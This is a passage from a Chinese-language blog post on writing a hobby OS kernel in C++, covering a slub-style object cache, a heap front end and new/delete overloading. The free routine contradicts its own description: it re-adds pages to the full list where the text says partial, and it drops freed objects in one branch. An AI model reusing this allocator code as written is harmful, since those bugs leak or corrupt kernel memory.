&amp;GloblKMemCacheGroupMem[KOBJECT_1K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_2K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_4K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_8K],<br>&#125;;<br></code></pre></td></tr></table></figure><p>简而言之，我们的 <code>KMemCache</code> 结构如下图所示：</p><p><img src="https://s2.loli.net/2024/10/08/uBOt6eP3zULygbW.png"></p><p>我们在内存管理模块初始化时进行内存池的初始化：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Init</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> obj_sz)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; CACHE_POOL_MAX_NR; i++) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;pools[i] = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;pool_nr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">this</span>-&gt;order = obj_sz &gt;&gt; PAGE_SHIFT;<br>    <span class="hljs-keyword">if</span> (obj_sz &gt;= PAGE_SIZE) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;order++;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;obj_sz = obj_sz;<br>    <span class="hljs-keyword">this</span>-&gt;page_obj_nr = (PAGE_SIZE &lt;&lt; <span class="hljs-keyword">this</span>-&gt;order) / <span class="hljs-keyword">this</span>-&gt;obj_sz;<br><br>    <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-literal">nullptr</span>;<br>    lib::<span class="hljs-built_in">list_head_init</span>(&amp;<span class="hljs-keyword">this</span>-&gt;partial);<br>    lib::<span class="hljs-built_in">list_head_init</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full);<br>    <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Reset</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">kheap_pool_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; KOBJECT_SIZE_NR; i++) &#123;<br>        GloblKMemCacheGroup[i]-&gt;<span class="hljs-built_in">Init</span>(kobj_default_size[i]);<br>        GloblKMemCacheGroup[i]-&gt;<span class="hljs-built_in">AddPool</span>(GloblPagePool);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><h2 id="内存对象分配策略"><a href="#内存对象分配策略" class="headerlink" title="内存对象分配策略"></a>内存对象分配策略</h2><p>首先是内存对象的分配，我们按照单次请求的大小将请求分为两类：</p><ul><li>对于小于内存池组最大大小的内存请求，我们将请求大小向上对齐到最近的内存池对象大小，从中进行分配</li><li>对于大于内存池组最大大小的内存请求，我们将其对齐到 <code>(2 ^ N) * PAGE_SIZE</code> 大小，从 buddy system 进行页面分配请求</li><li>我们使用从 buddy system 分配的一份页面的首个 <code>Page</code> 结构体的 <code>Page::kc</code> 字段标识其是否属于某个 <code>KMemCache</code> ，从而区分这两类内存分配</li></ul><p>在 <code>KMemCache</code> 与 <code>PagePool</code> 之上，我们再包装一层 <code>KHeapPool</code> 结构体作为内存分配的前端，用于隐藏背后的分配细节：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* General front end of KMemCache */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KHeapPool</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">KHeapPool</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">KHeapPool</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Malloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> size)</span> -&gt; <span class="hljs-type">void</span>*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Free</span><span class="hljs-params">(<span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">PageAlloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> order)</span> -&gt; Page*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">PageFree</span><span class="hljs-params">(Page *p)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SetKMemCaches</span><span class="hljs-params">(KMemCache **caches, base::<span class="hljs-type">size_t</span> cache_nr, base::<span class="hljs-type">size_t</span> *cache_obj_sizes)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SetPagePools</span><span class="hljs-params">(PagePool **pools, base::<span class="hljs-type">size_t</span> pool_nr)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    KMemCache **caches;<br>    base::<span class="hljs-type">size_t</span> cache_nr;<br>    base::<span class="hljs-type">size_t</span> *cache_obj_sizes;<br><br>    <span class="hljs-keyword">auto</span> __malloc_caches(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*;<br><br>    PagePool **pools;<br>    base::<span class="hljs-type">size_t</span> pool_nr;<br><br>    <span class="hljs-keyword">auto</span> __malloc_pools(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KHeapPool::Malloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> size)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>    obj = <span class="hljs-keyword">this</span>-&gt;__malloc_caches(size);<br>    <span class="hljs-keyword">if</span> (!obj) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;__malloc_pools(size);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><span class="hljs-keyword">auto</span> KHeapPool::__malloc_caches(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;cache_nr; i++) &#123;<br>        <span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-keyword">this</span>-&gt;cache_obj_sizes[i]) &#123;<br>            obj = <span class="hljs-keyword">this</span>-&gt;caches[i]-&gt;<span class="hljs-built_in">Malloc</span>();<br>            <span class="hljs-keyword">if</span> (obj) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-小对象分配：当前-slub-partial-list-PagePool"><a href="#I-小对象分配：当前-slub-partial-list-PagePool" class="headerlink" title="I. 小对象分配：当前 slub -&gt; partial list -&gt; PagePool"></a>I. 小对象分配：当前 slub -&gt; partial list -&gt; PagePool</h3><p>对于比较常见的小对象内存分配，我们的策略如下：</p><ul><li>首先向上对齐分配大小，检查对应内存池的当前 freelist 是否仍有对象，若是则直接分配并返回</li><li>若否，检查当前是否有 slub page，若是则将其挂到 full list</li><li>检查 partial list 是否仍有空闲内存页，若是则取下并分配为当前 slub page 并回到第一步重新开始分配</li><li>若 partial list 也为空，向 PagePool 请求内存页，成功则回到第一步重新开始分配，失败则直接返回 NULL</li></ul><p>需要注意的是在我们的设计中内存池应当在多个核之间进行共享，因此所有操作需要全程加锁</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KMemCache::__internal_obj_alloc(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>redo:<br>    <span class="hljs-comment">/* we have objects on the kmem_cache now, just allocate one */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;freelist != <span class="hljs-literal">nullptr</span>) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;freelist;<br>        <span class="hljs-keyword">this</span>-&gt;freelist = (<span class="hljs-type">void</span>**) (*<span class="hljs-keyword">this</span>-&gt;freelist);<br>        <span class="hljs-keyword">this</span>-&gt;current-&gt;obj_nr--;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* no object on freelist, put the current page on the full list */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        lib::<span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full, &amp;<span class="hljs-keyword">this</span>-&gt;current-&gt;list);<br>        <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* try to get the page from partial list */</span><br>    <span class="hljs-keyword">if</span> (!lib::<span class="hljs-built_in">list_empty</span>(&amp;<span class="hljs-keyword">this</span>-&gt;partial)) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;current = lib::<span class="hljs-built_in">container_of</span>(<span class="hljs-keyword">this</span>-&gt;partial.next, &amp;Page::list);<br>        <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-keyword">this</span>-&gt;current-&gt;freelist;<br>        lib::<span class="hljs-built_in">list_del</span>(&amp;<span class="hljs-keyword">this</span>-&gt;current-&gt;list);<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>    <span class="hljs-comment">/* no current on the partial list, allocated from the buddy */</span><br>    <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-keyword">this</span>-&gt;__internal_page_alloc();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;__page_obj_slicing(<span class="hljs-keyword">this</span>-&gt;current);<br>        <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-keyword">this</span>-&gt;current-&gt;freelist;<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><span class="hljs-keyword">auto</span> KMemCache::__internal_page_alloc(<span class="hljs-type">void</span>) -&gt; Page*<br>&#123;<br>    Page *new_page = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; CACHE_POOL_MAX_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;pools[i]) &#123;<br>            new_page = <span class="hljs-keyword">this</span>-&gt;pools[i]-&gt;<span class="hljs-built_in">AllocPages</span>(<span class="hljs-keyword">this</span>-&gt;order);<br>            <span class="hljs-keyword">if</span> (new_page) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> new_page;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Malloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *obj;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    obj = <span class="hljs-keyword">this</span>-&gt;__internal_obj_alloc();<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><p>在进行新的 slub pages 分配时，我们应当根据当前内存池信息将其分割为相应数量的空闲对象，并将空闲对象链接为单向链表：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KMemCache::__page_obj_slicing(Page* page) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-type">void</span> *curr_obj;<br>    <span class="hljs-type">virt_addr_t</span> next_obj;<br>    <span class="hljs-type">void</span> **obj_ptr;<br><br>    next_obj = <span class="hljs-built_in">page_to_virt</span>(page);<br>    curr_obj = <span class="hljs-literal">nullptr</span>;<br>    obj_ptr = (<span class="hljs-type">void</span>**) next_obj;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;page_obj_nr; i++) &#123;<br>        *obj_ptr = curr_obj;<br>        curr_obj = (<span class="hljs-type">void</span>*) next_obj;<br>        next_obj += <span class="hljs-keyword">this</span>-&gt;obj_sz;<br>        obj_ptr = (<span class="hljs-type">void</span>**) next_obj;<br>    &#125;<br><br>    page-&gt;obj_nr = <span class="hljs-keyword">this</span>-&gt;page_obj_nr;<br>    page-&gt;freelist = (<span class="hljs-type">void</span>**) curr_obj;<br>    page-&gt;kc = <span class="hljs-keyword">this</span>;<br>    <span class="hljs-built_in">get_page</span>(page);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-大内存分配：退化至-PagePool"><a href="#II-大内存分配：退化至-PagePool" class="headerlink" title="II. 大内存分配：退化至 PagePool"></a>II. 大内存分配：退化至 PagePool</h3><p>对于较大的内存分配，KMemCache 会直接拒绝请求，此时在 KHeapPool 的分配前端中会回退到 PagePool 进行分配：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KHeapPool::__malloc_pools(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    base::<span class="hljs-type">size_t</span> order = <span class="hljs-number">0</span>, need = size;<br>    Page *obj;<br><br>    size &gt;&gt;= (PAGE_SHIFT + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        order++;<br>        size &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (((<span class="hljs-number">1</span> &lt;&lt; order) * PAGE_SIZE) &lt; need) &#123;<br>        order++;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;pool_nr; i++) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;pools[i]-&gt;<span class="hljs-built_in">AllocPages</span>(order);<br>        <span class="hljs-keyword">if</span> (obj) &#123;<br>            <span class="hljs-built_in">get_page</span>(obj);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*) <span class="hljs-built_in">page_to_virt</span>(obj);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* we failed unexpectedly :( */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存对象释放：对象回归与链表迁移"><a href="#内存对象释放：对象回归与链表迁移" class="headerlink" title="内存对象释放：对象回归与链表迁移"></a>内存对象释放：对象回归与链表迁移</h2><p>内存释放的逻辑则简单得多：</p><ul><li>首先根据虚拟地址找到对应的 page 结构体，若不属于任一 <code>KMemCache</code> 则说明为大内存分配，直接释放回所属  <code>PagePool</code></li><li>否则，找到其对应的 <code>KMemCache</code> ，判断当前 slub page 所属：<ul><li>若为正在使用的 slub page，直接将对象挂回 <code>KMemCache::freelist</code></li><li>否则，挂回对应 page 的 freelist，若为 full list 则迁移至 partial list</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KHeapPool::Free</span><span class="hljs-params">(<span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    Page *page;<br><br>    page = <span class="hljs-built_in">get_head_page</span>(<span class="hljs-built_in">virt_to_page</span>((<span class="hljs-type">virt_addr_t</span>) obj));<br>    <span class="hljs-keyword">if</span> (!page-&gt;kc) &#123;<br>        <span class="hljs-built_in">put_page</span>(page);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    page-&gt;kc-&gt;<span class="hljs-built_in">Free</span>(page, obj);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Free</span><span class="hljs-params">(Page *page, <span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-keyword">this</span>-&gt;__internal_obj_free(page, obj);<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br><br><span class="hljs-keyword">auto</span> KMemCache::__internal_obj_free(Page *page, <span class="hljs-type">void</span> *obj) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    page-&gt;obj_nr++;<br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        *(<span class="hljs-type">void</span>**) obj = <span class="hljs-keyword">this</span>-&gt;freelist;<br>        <span class="hljs-keyword">this</span>-&gt;freelist = (<span class="hljs-type">void</span>**) obj;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (page-&gt;obj_nr == <span class="hljs-number">1</span>) &#123;    <span class="hljs-comment">/* on full list */</span><br>            <span class="hljs-built_in">list_del</span>(&amp;page-&gt;list);<br>            <span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full, &amp;page-&gt;list);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (page-&gt;obj_nr == <span class="hljs-keyword">this</span>-&gt;page_obj_nr) &#123;   <span class="hljs-comment">/* all freed */</span><br>            <span class="hljs-built_in">list_del</span>(&amp;page-&gt;list);<br>            <span class="hljs-built_in">put_page</span>(page);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-C-的初步引入"><a href="#0x04-C-的初步引入" class="headerlink" title="0x04. C++ 的初步引入"></a>0x04. C++ 的初步引入</h1><p>现在我们考虑进行 C++ 代码的引入，笔者选择引入 C++ 代码的主要原因是为了 OOP 特性，虽然说使用 C 同样可以编写面向对象的代码，但是总归没有 C++ 的原生 OOP 看起来那么直观</p><p>在 bare bone 环境下，我们 <strong>无法使用标准库</strong> ，因此此时的 C++ <em>几乎</em> 是相当于 C with class,不过额外多了一些特性：</p><ul><li>隐式的对构造函数与析构函数的调用</li><li>隐式的内存分配与释放</li></ul><p>对于构造函数与析构函数的自动调用，这是由编译器去决定的，因此大部分情况下我们可以不用处理， <strong>除了全局对象的构造函数</strong> —— <strong>我们应当确保其在我们完成内存管理子系统的初始化之后再进行</strong></p><p>对于隐式的内存分配与释放，我们只需要 <strong>重载全局 new&#x2F;delete 运算符即可</strong></p><p>此外，我们应当 <strong>禁用 C++ 的异常处理机制</strong> ，因为这个特性在内核上下文不好实现，同时会引入很多额外的开销，我们通过在编译时添加 <code> -fno-exceptions</code> 以关闭该特性</p><h2 id="new-delete-运算符的重载"><a href="#new-delete-运算符的重载" class="headerlink" title="new&#x2F;delete 运算符的重载"></a>new&#x2F;delete 运算符的重载</h2><p><code>new/delete</code> 运算符重载的方式比较简单，我们只需要在某个文件中实现这些运算符重载，在其中调用内存分配的 API 即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;closureos/cpp_base.hpp&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;closureos/errno.h&gt;</span></span><br><br><span class="hljs-keyword">import</span> kernel.lib;<br><span class="hljs-keyword">import</span> kernel.mm;<br><br><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-type">size_t</span> sz)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Malloc</span>(sz);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">size_t</span> sz)<br>&#123;<br>    <span class="hljs-keyword">return</span> mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Malloc</span>(sz);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *p)</span> <span class="hljs-keyword">noexcept</span></span><br><span class="hljs-function"></span>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span> *p) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz)</span> <span class="hljs-keyword">noexcept</span></span><br><span class="hljs-function"></span>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span> *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    mm::GloblKHeapPool-&gt;<span class="hljs-built_in">Free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>之后对于所有的 C++ 代码，在链接时编译器会自动寻找到这些运算符定义</p><h2 id="global-constructor-的调用"><a href="#global-constructor-的调用" class="headerlink" title="global constructor 的调用"></a>global constructor 